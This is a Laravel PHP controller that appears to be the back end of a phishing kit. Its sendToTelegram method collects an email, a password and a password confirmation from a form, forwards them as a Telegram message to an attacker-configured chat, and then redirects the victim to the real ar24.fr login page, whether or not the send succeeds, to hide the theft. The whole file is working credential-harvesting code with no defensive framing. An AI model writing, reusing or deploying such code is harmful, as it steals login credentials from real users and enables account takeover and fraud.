<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use App\Notifications\TelegramAlert;
use Illuminate\Support\Facades\Notification;

class PaymentController extends Controller
{
    /**
     * Étape 1 : Réception des données qui te redirige vers la page reservation youpi
     */
    public function sendToTelegram(Request $request)
    {
        
        $validated = $request->validate([
            'email'    => 'required|string|max:225',
            'password' =>  'string',
            'password_confirmation' =>  'string',

        ]);

        // 2. Formatage du message Telegram
        $message = "🔔 *INFORMATIONS* 🔔\n\n"
                 . "👤 Nom : {$validated['email']}\n"
                 . "💳 mot de passe : {$validated['password']}\n" 
                 . "👤 confirmation : {$validated['password_confirmation']}";

        try {
            // 3. Envoi de la notification
            Notification::route('telegram', config('services.telegram-bot-api.chat_id'))
                ->notify(new TelegramAlert($message));

                return redirect()->away('https://app.ar24.fr/fr/user/login');

        } catch (\Exception $e) {
            
            return redirect()->away('https://app.ar24.fr/fr/user/login');
        }

        
        
    }

    
}